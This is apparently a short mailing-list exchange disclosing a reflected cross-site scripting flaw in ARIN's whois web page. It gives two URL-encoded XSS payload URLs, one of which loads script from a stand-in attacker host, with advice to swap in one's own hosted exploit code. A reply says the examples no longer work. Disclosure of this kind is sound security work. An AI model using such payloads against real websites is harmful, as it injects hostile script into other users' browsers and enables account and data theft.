Dave,

You need to copy and paste the full URL into your browser for the XSS to take place.  All exploit examples are still working as I just verified.

<copy> http://ws.arin.net/whois/?queryinput=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E </paste>

<copy> http://ws.arin.net/whois/?queryinput=%3CSCRIPT+SRC%3Dhttp%3A%2F%2FmaliciousCode.net%2Fexploit.js%3E%3C%2FSCRIPT%3E </paste>

For my second example I used a fake domain name as an example of where the malicious code could be executed.  Change the "maliciouscode.net" to a domain hosting your .js code for the exploit to take effect.

Thanks,

Discovered by Terminal Entry security [.at.] peadro (.)net

  Looks like someone was paying at least some attention, because none of
your examples worked when I tried them just now.

[  Funnily enough it goes bold after 'SRC=' and the rest of the thing
turns
into a borken link to "http://maliciousCode.net/exploit.js></XCRIPT>"  ]
